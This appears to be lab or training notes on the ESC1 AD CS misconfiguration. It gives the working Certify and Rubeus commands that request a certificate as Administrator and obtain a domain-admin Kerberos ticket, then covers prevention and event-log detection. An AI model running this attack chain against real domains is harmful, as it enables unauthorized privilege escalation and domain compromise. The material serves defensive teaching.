## Description
The **Certified Pre-Owned** research paper by SpectreOps highlighted Active Directory Certificate Services (AD CS) as a popular attack vector due to its common misconfigurations. Certificates are highly advantageous for attackers because:
- Certificates are valid long-term, often for a year or more.
- User password resets don’t invalidate certificates.
- Misconfigured templates allow attackers to obtain certificates for other users.
- Compromising a Certificate Authority (CA) private key enables forging "Golden Certificates."

One notable privilege escalation attack method is **ESC1**, which involves:
- No issuance requirements.
- Enrollable client authentication/smart card logon OID templates.
- The `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag.

## Attack Execution: ESC1 Example

1. **Scan for Vulnerabilities** with **Certify**:
    ```powershell
    .\Certify.exe find /vulnerable
    ```
    The output will identify vulnerable certificate templates. Here, **UserCert** is identified as vulnerable due to:
    - Accessible by all domain users.
    - Allows requester-supplied SAN (allows impersonating other users).
    - No manager approval required.
    - Supports client authentication for login.

2. **Abuse the Template** by requesting a certificate for the "Administrator" user:
    ```powershell
    .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
    ```
    This generates a PEM-format certificate, which can be converted to **PFX** for compatibility with tools like **Rubeus**.

3. **Convert PEM to PFX**:
    ```bash
    sed -i 's/\s\s\+/\n/g' cert.pem
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    ```

4. **Use Rubeus to Request a TGT** for the Administrator account:
    ```powershell
    .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
    ```
    Successful authentication as the Administrator will allow access to resources on DC1, such as listing contents of `\\dc1\c$`.

## Prevention
Preventing the ESC1 attack involves:
- Disabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` in certificate templates.
- Enforcing **CA certificate manager approval** for certificate issuance to ensure only legitimate requests are approved.

Regular PKI environment scans with **Certify** or similar tools are recommended to identify and mitigate PKI misconfigurations.

## Detection
1. **Event IDs 4886 and 4887**: AD logs events for certificate requests (4886) and certificate issuance (4887). These logs indicate certificate issuance activity but do not specify SAN values.
2. **Listing Issued Certificates**: Checking the CA’s issued certificate list can reveal certificates issued with the vulnerable template, although SAN details require manual review.
3. **Event ID 4768**: Logs the TGT request when the certificate is used for authentication.

To automate detection, use **certutil**:
```powershell
certutil -view
```

Example to find logs programmatically:
```powershell
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

## Remote Session Monitoring
If direct GUI access is unavailable, use **PSSession** to access the PKI machine and query for certificate issuance events:
```powershell
New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

---
**Note**: Monitoring and auditing PKI activities for unauthorized certificate issuance is critical to maintaining a secure AD CS environment.